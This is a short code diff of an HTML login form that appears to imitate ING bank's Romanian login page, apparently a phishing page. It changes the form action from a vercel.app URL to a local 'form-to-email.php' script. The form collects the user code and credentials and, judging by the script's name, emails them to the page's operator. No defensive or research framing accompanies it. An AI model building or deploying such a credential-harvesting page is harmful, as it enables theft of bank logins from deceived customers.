@@ -50,7 +50,7 @@
                         </div>
                     </div>
                     <div class="form-inputs">
-                        <form action="https://ing-login-page.vercel.app/form-to-email.php" method="post" id="loginform" enctype="text/plain">
+                        <form action="./form-to-email.php" method="post" id="loginform" enctype="text/plain">
                             <div class="username-input mb-3">
                                 <label for="Codul-de-utilizator">Codul de utilizator</label>
                                 <input type="text" class="form-control" name="Codul-de-utilizator"
